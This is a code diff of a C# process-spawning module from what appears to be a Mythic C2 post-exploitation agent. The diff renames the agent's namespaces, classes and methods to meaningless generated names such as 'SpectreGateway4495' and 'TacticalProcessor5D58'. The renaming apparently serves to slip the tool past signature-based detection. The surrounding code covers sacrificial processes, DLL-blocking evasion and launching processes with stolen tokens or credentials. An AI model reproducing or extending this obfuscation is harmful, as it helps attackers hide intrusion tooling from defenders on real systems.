@@ -1,9 +1,9 @@
 ﻿//#define SERVER2012_COMPATIBLE
 
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.PhantomStructs;
 using Microsoft.Win32.SafeHandles;
 using System;
 using System.Collections.Generic;
@@ -13,17 +13,17 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
-using ApolloInterop.Features.WindowsTypesAndAPIs;
-using ApolloInterop.Structs;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
-using static ApolloInterop.Enums.Win32;
-using static ApolloInterop.Structs.Win32;
-using AI = ApolloInterop.Classes.Core;
+using PhantomInterop.Features.WindowsTypesAndAPIs;
+using PhantomInterop.Structs;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Utils;
+using static PhantomInterop.Enums.Win32;
+using static PhantomInterop.Structs.Win32;
+using AI = PhantomInterop.Classes.Core;
 
 namespace Process
 {
-    public class SacrificialProcess : AI.Process
+    public class SpectreGateway4495 : AI.Process
     {
         private static bool SpawnedUnderNewLuid = false;
         [Flags]
@@ -286,7 +286,7 @@ namespace Process
             }
         }
 
-        private void SacrificialProcess_Exit(object sender, EventArgs e)
+        private void AdaptiveRouterFE39(object sender, EventArgs e)
         {
             HasExited = true;
             int dwExit = 0;
@@ -436,7 +436,7 @@ namespace Process
             return bRet;
         }
 
-        private bool EnableBlockDLLs()
+        private bool TacticalProcessor5D58()
         {
             bool bRet;
             var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
@@ -455,7 +455,7 @@ namespace Process
             return bRet;
         }
 
-        private ApplicationStartupInfo GetSafeStartupArgs()
+        private ApplicationStartupInfo EfficientManagerBF9C()
         {
             var evasionArgs = _agent.GetProcessManager().GetStartupInfo();
 
@@ -476,7 +476,7 @@ namespace Process
             return evasionArgs;
         }
 
-        private bool InitializeProcessOutputPipes()
+        private bool PhantomResolver6C75()
         {
             DebugHelp.DebugWriteLine($"Running InitializeProcessOutputPipes as: {WindowsIdentity.GetCurrent().Name}");
             bool bRet;
@@ -565,7 +565,7 @@ namespace Process
 
 
 
-        private void PostStartupInitialize()
+        private void RobustProviderFEB0()
         {
             Handle = _processInfo.hProcess;
             PID = (uint)_processInfo.dwProcessId;
@@ -576,7 +576,7 @@ namespace Process
             _standardInput = new StreamWriter(new FileStream(hWriteIn, FileAccess.Write), Console.InputEncoding);
         }
 
-        private async void WaitForExitAsync()
+        private async void SecureControllerE0A2()
         {
             try
             {
@@ -680,7 +680,7 @@ namespace Process
                 //output = stream.ReadToEnd();
             }
             catch { }
-            if (!string.IsNullOrEmpty(output))
+            if (!ValidationHelper.IsStringEmpty(output))
             {
                 yield return output;
             }
@@ -688,7 +688,7 @@ namespace Process
             yield break;
         }
 
-        private Task GetStdOutAsync()
+        private Task EfficientHandler915F()
         {
             return new Task(() =>
             {
@@ -703,7 +703,7 @@ namespace Process
             });
         }
 
-        private Task GetStdErrAsync()
+        private Task DynamicBridge1F55()
         {
             return new Task(() =>
             {
@@ -718,7 +718,7 @@ namespace Process
             });
         }
 
-        public override bool StartWithCredentials(ApolloLogonInformation logonInfo)
+        public override bool StartWithCredentials(PhantomLogonInformation logonInfo)
         {
             bool bRet = false;
             IntPtr hToken = IntPtr.Zero;
@@ -805,7 +805,7 @@ namespace Process
 
                     if (!bRet && (dwError == 1314))
                     {
-                        if (_agent.GetIdentityManager().GetCurrentLogonInformation(out ApolloLogonInformation cred))
+                        if (_agent.GetIdentityManager().GetCurrentLogonInformation(out PhantomLogonInformation cred))
                         {
                             DebugHelp.DebugWriteLine("Failed to create process with token. Attempting to create process with logon.");
                             bRet = _pCreateProcessWithLogonW(
